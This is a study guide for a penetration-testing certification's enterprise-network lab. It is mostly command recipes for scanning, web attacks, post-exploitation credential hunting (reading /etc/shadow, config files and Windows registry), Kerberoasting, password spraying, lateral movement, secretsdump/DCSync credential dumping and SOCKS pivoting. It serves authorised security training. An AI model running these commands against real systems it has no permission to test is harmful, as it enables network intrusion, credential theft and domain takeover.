# 26 — Attacking Enterprise Networks (Capstone)

This is the most important module for the CPTS exam. The "Attacking Enterprise Networks" HTB module simulates the actual exam environment — a multi-subnet enterprise network with web apps, Linux/Windows hosts, and Active Directory. This guide covers the methodology for systematically attacking this kind of environment.

---

## The Enterprise Network Mindset

On standalone machines (OSCP-style), each target is independent. On an enterprise network (CPTS-style), everything is connected:

```
STANDALONE THINKING:
  Machine A: scan → exploit → root → done
  Machine B: scan → exploit → root → done
  Machine C: scan → exploit → root → done

ENTERPRISE THINKING:
  Machine A: scan → exploit → find creds for B
  Machine B: use A's creds → exploit → find info about internal network
  Machine C: pivot through B → find AD creds → lateral movement
  Domain Controller: chain everything → domain admin
```

**The key difference:** On an enterprise network, the output of one machine is the input for the next. A password, an SSH key, a hostname in a config file, a note in a ticketing system — everything is a breadcrumb leading to the next target.

---

## Phase 1: External Enumeration

You start from the outside. Pretend you're an attacker on the internet targeting a company.

```bash
# Discover all live hosts in scope
nmap -sn SCOPE_RANGE -oG alive.gnmap
grep "Up" alive.gnmap | awk '{print $2}' > live_hosts.txt

# Full port scan every live host
nmap -sV -sC -p- --min-rate=1000 -oA full_scan -iL live_hosts.txt

# UDP top ports
sudo nmap -sU --top-ports 50 -oA udp_scan -iL live_hosts.txt

# Review results — build your target list
# For each host, note:
#   - Open ports
#   - Service versions
#   - Operating system
#   - Any interesting nmap script output
```

### Categorize what you find

```
WEB SERVERS (HTTP/HTTPS):
  List every web service with its URL and technology
  → These get full web enumeration (ffuf, source analysis, app identification)

AUTHENTICATION SERVICES (SSH, RDP, WinRM, SMB):
  Note these for credential testing later
  → Every password you find gets tried on ALL of these

ACTIVE DIRECTORY INDICATORS:
  Port 88 (Kerberos) → this is a Domain Controller
  Port 389/636 (LDAP/LDAPS) → AD enumeration target
  Port 445 (SMB) → enumerate shares, users

DATABASE SERVICES:
  Port 3306 (MySQL), 1433 (MSSQL), 5432 (PostgreSQL)
  → Try default creds, test credentials found elsewhere

OTHER SERVICES:
  FTP (21), SNMP (161/udp), NFS (2049), DNS (53)
  → Each has specific enumeration techniques
```

---

## Phase 2: Web Application Attacks

Web apps are almost always the initial foothold on a CPTS exam.

### For every web server found

```bash
# Step 1: Identify the application
whatweb http://TARGET
curl -I http://TARGET

# Step 2: Check for known applications
# Is it WordPress? Tomcat? Jenkins? GitLab?
# Check the application discovery table in module 22

# Step 3: Try default credentials (BEFORE anything else)
# See the default credentials table in module 22

# Step 4: Web fuzzing
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt,.html,.bak,.conf -fc 404

# Step 5: Virtual host discovery
ffuf -u http://TARGET -H "Host: FUZZ.domain.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs DEFAULT_SIZE

# Step 6: Check source code, robots.txt, .git, .env
# Step 7: Test every input for injection (SQLi, command injection, LFI, XSS)
# Step 8: Test for IDOR, XXE, verb tampering on API endpoints
```

### When you find a vulnerability

```
SQL Injection:
  1. Confirm manually (single quote test)
  2. Extract data with SQLMap: sqlmap -r request.txt --batch --dbs
  3. Dump ALL credentials tables
  4. Try every credential on every service across the network

Command Injection:
  1. Confirm with: ;id or |whoami
  2. Get a reverse shell immediately
  3. Post-exploitation: harvest creds, enumerate, pivot

File Upload:
  1. Upload a PHP web shell
  2. Verify execution
  3. Upgrade to reverse shell

LFI:
  1. Read /etc/passwd (Linux) or C:\Windows\win.ini (Windows)
  2. Read application config files (database credentials!)
  3. Try log poisoning for RCE
  4. Try PHP wrappers (php://filter for source code)
```

---

## Phase 3: Post-Exploitation and Credential Harvesting

**Every compromised host is a gold mine of credentials and intelligence.** Don't rush to the next machine — thoroughly loot what you have.

### Linux post-exploitation checklist

```bash
# Identity and access
whoami && id && hostname
sudo -l

# Network intelligence (find more targets)
ip a                          # What networks am I on?
ip route                      # What can I route to?
arp -a                        # Who else is on this network?
cat /etc/hosts                # Hostnames of internal systems
cat /etc/resolv.conf          # Internal DNS server (probably the DC)
ss -tlnp                      # What's listening? What's connected?

# Credential hunting
cat /etc/shadow               # if readable
find / -name "*.conf" -exec grep -li "pass" {} \; 2>/dev/null
find / -name "*.php" -exec grep -li "password" {} \; 2>/dev/null
find / -name "*.xml" -exec grep -li "password" {} \; 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name ".bash_history" 2>/dev/null
cat ~/.bash_history
env                           # environment variables might contain creds

# Application config files
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /var/www/html/.env
cat /opt/*/config*
find /opt -name "*.yml" -o -name "*.yaml" -o -name "*.conf" | xargs grep -li "pass" 2>/dev/null

# Database access (if you found DB credentials)
mysql -u user -p'password' -e "SELECT * FROM users"
```

### Windows post-exploitation checklist

```cmd
:: Identity
whoami /all
net user %USERNAME%
net localgroup Administrators

:: Network intelligence
ipconfig /all
arp -a
route print
netstat -ano
type C:\Windows\System32\drivers\etc\hosts

:: Credential hunting
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
findstr /si "password" C:\*.txt C:\*.ini C:\*.config C:\*.xml
dir /s /b C:\Users\*.kdbx 2>nul
dir /s /b C:\Users\*id_rsa* 2>nul

:: Domain information (if domain-joined)
net user /domain
net group /domain
net group "Domain Admins" /domain
```

---

## Phase 4: Active Directory Attacks

Once you have ANY domain credentials, AD enumeration begins.

```bash
# Step 1: Enumerate the domain
crackmapexec smb DC_IP -u user -p pass --users
crackmapexec smb DC_IP -u user -p pass --shares
crackmapexec smb DC_IP -u user -p pass --groups

# Step 2: BloodHound (find the attack path)
bloodhound-python -u user -p pass -d domain.local -ns DC_IP -c all
# Import the data into BloodHound
# Look for: shortest path to Domain Admin

# Step 3: Kerberos attacks
# AS-REP Roasting (no pre-auth users)
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# Kerberoasting (service accounts)
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request

# Step 4: Crack the hashes
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt    # AS-REP
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt       # Kerberoast

# Step 5: Password spray with found/common passwords
crackmapexec smb DC_IP -u users.txt -p 'FoundPassword1!' --continue-on-success

# Step 6: Lateral movement
crackmapexec smb RANGE -u admin_user -p admin_pass --continue-on-success
# Machines showing (Pwn3d!) = you have admin access
evil-winrm -i TARGET -u admin_user -p admin_pass
impacket-psexec domain/admin_user:admin_pass@TARGET

# Step 7: Credential dumping on compromised hosts
impacket-secretsdump domain/admin_user:admin_pass@TARGET

# Step 8: DCSync (need Domain Admin or equivalent)
impacket-secretsdump domain/admin_user:admin_pass@DC_IP
```

---

## Phase 5: Pivoting to Internal Networks

When you discover internal networks from a compromised host:

```bash
# From the compromised host, check what else it can reach
ip route                      # shows connected networks
arp -a                        # shows nearby hosts on each network
for i in $(seq 1 254); do ping -c 1 -W 1 172.16.0.$i &>/dev/null && echo "172.16.0.$i is alive"; done

# Set up a SOCKS proxy through the compromised host
ssh -D 9050 -fN user@PIVOT_HOST

# Scan the internal network through the proxy
proxychains nmap -sT -Pn 172.16.0.0/24 -p 22,80,445,3389,5985

# Access internal web apps through the proxy
proxychains curl http://172.16.0.10
# Or configure your browser's SOCKS proxy to 127.0.0.1:9050

# Access internal services
proxychains evil-winrm -i 172.16.0.20 -u admin -p pass
proxychains ssh user@172.16.0.30
```

---

## The Credential Reuse Matrix

**This is the single most important concept on the CPTS exam.** Every credential you find must be tested against every service on every host.

```
FOUND: admin:P@ssw0rd! on the web application database

TEST ON:
  □ SSH on every Linux host
  □ RDP on every Windows host
  □ WinRM on every Windows host
  □ SMB on every Windows host
  □ Every other web application login
  □ Database services (MySQL, MSSQL, PostgreSQL)
  □ FTP on every host
  □ Domain authentication (if it's a domain account)

USE:
  crackmapexec smb ENTIRE_RANGE -u admin -p 'P@ssw0rd!'
  crackmapexec winrm ENTIRE_RANGE -u admin -p 'P@ssw0rd!'
  crackmapexec ssh ENTIRE_RANGE -u admin -p 'P@ssw0rd!'
```

People reuse passwords. Service accounts share credentials across systems. A password from a web app database might be the SSH password for the next host, which might be the domain password for an AD user. **Test everything everywhere.**

---

## Common CPTS Attack Chains

```
Chain 1: Web App → Database → Credential Reuse → AD
  SQLi extracts DB creds → creds reused on SSH → 
  internal enumeration finds AD creds → Kerberoast → Domain Admin

Chain 2: Default Creds → App RCE → Pivot → AD
  Tomcat default creds → WAR upload → shell on Tomcat server →
  find config with internal creds → pivot to internal → AD attacks

Chain 3: Public Exploit → Privesc → Credential Dump → Lateral
  CVE on web server → shell as www-data → SUID privesc → root →
  read config files → SSH to next host → repeat

Chain 4: FTP/SMB → Cred Discovery → Web App Access → RCE
  Anonymous FTP has docs with creds → creds work on web app →
  web app has file upload → PHP shell → internal network
```

---

## When You're Stuck

```
□ Have you tried EVERY found credential on EVERY service?
□ Have you checked EVERY web app for default credentials?
□ Have you run ffuf with extensions on EVERY web server?
□ Have you read the source code of EVERY web page?
□ Have you checked robots.txt and .git on EVERY web server?
□ Have you read ALL files on compromised hosts? (config, history, notes)
□ Have you scanned from INSIDE compromised hosts for new networks?
□ Have you run BloodHound and checked all attack paths?
□ Have you checked for IDOR, XXE, and verb tampering on APIs?
□ Have you taken a break? Sleep on it and come back fresh.
```
